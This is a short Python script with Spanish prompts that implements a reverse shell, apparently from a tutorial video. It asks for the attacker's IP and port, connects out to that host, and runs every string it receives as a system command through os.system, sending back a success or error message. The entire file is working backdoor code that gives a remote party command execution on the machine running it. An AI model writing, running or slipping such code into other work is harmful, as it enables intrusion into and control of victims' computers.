#-*-coding:utf-8-*-
from socket import *
from os import system
# https://www.youtube.com/watch?v=mPP4542OW2g
if __name__ == '__main__':
	sock = socket(AF_INET, SOCK_STREAM)
	ip = str(input("Ingresa la ip del atacante: "))
	port = int(input("Ingresa el puerto: "))
	sock.connect((ip,port))
	while True:
		try:
			system(sock.recv(4096).decode())
			sock.send(str("Se ha ejecutado el comando correctamente.".encode()))
		except Exception as e:
			sock.send("Hubo un problema al ejecutar el comando:\n{}".format(e).encode())	